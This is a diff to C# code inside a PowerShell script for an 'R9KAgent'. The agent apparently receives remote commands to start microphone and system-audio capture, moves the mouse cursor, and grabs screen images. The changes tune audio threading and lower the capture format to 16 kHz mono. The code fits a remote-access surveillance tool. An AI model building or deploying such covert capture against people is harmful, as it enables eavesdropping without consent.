@@ -134,6 +134,7 @@ if (-not ("R9KAgent" -as [type])) {
             public IntPtr reserved;
         }
 
+        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
         delegate void WaveCallback(IntPtr hwi, uint uMsg, IntPtr dwInstance, IntPtr dwParam1, IntPtr dwParam2);
 
         static string IP;
@@ -150,7 +151,6 @@ if (-not ("R9KAgent" -as [type])) {
         static Thread bannerThread = null;
         static StreamWriter globalWriter = null;
 
-        // Otimização de Memória para o Mouse não travar
         static Bitmap reuseBmp = null;
         static Graphics reuseGfx = null;
         static ImageCodecInfo jpgCodec = null;
@@ -255,7 +255,7 @@ if (-not ("R9KAgent" -as [type])) {
                         if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
                     }
                 } catch {}
-                Thread.Sleep(1); // Mais rápido possível
+                Thread.Sleep(1);
             }
         }
 
@@ -289,7 +289,10 @@ if (-not ("R9KAgent" -as [type])) {
                 
                 if (cmd == "mic_start" && !isMicRunning) {
                     isMicRunning = true;
-                    Thread t = new Thread(StartMic); t.IsBackground = true; t.Start();
+                    Thread t = new Thread(StartMic); 
+                    t.SetApartmentState(ApartmentState.MTA);
+                    t.IsBackground = true; 
+                    t.Start();
                     return;
                 }
                 if (cmd == "mic_stop") { 
@@ -300,7 +303,10 @@ if (-not ("R9KAgent" -as [type])) {
                 
                 if (cmd == "sys_start" && !isSysRunning) {
                     isSysRunning = true;
-                    Thread t = new Thread(StartSystemAudio); t.IsBackground = true; t.Start();
+                    Thread t = new Thread(StartSystemAudio); 
+                    t.SetApartmentState(ApartmentState.STA); // WASAPI REQUER STA
+                    t.IsBackground = true; 
+                    t.Start();
                     return;
                 }
                 if (cmd == "sys_stop") { 
@@ -421,8 +427,8 @@ if (-not ("R9KAgent" -as [type])) {
             try {
                 WAVEFORMATEX wfx = new WAVEFORMATEX();
                 wfx.wFormatTag = 1; // PCM
-                wfx.nChannels = 2;
-                wfx.nSamplesPerSec = 44100;
+                wfx.nChannels = 1;
+                wfx.nSamplesPerSec = 16000;
                 wfx.wBitsPerSample = 16;
                 wfx.nBlockAlign = (ushort)(wfx.nChannels * wfx.wBitsPerSample / 8);
                 wfx.nAvgBytesPerSec = wfx.nSamplesPerSec * wfx.nBlockAlign;
@@ -432,11 +438,11 @@ if (-not ("R9KAgent" -as [type])) {
                 
                 for (int i = 0; i < 2; i++) {
                     micHeaders[i] = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WAVEHDR)));
-                    micBuffers[i] = Marshal.AllocHGlobal(17640); // 100ms
+                    micBuffers[i] = Marshal.AllocHGlobal(6400); 
 
                     WAVEHDR hdr = new WAVEHDR();
                     hdr.lpData = micBuffers[i];
-                    hdr.dwBufferLength = 17640;
+                    hdr.dwBufferLength = 6400;
                     Marshal.StructureToPtr(hdr, micHeaders[i], false);
 
                     waveInPrepareHeader(hMic, micHeaders[i], Marshal.SizeOf(typeof(WAVEHDR)));
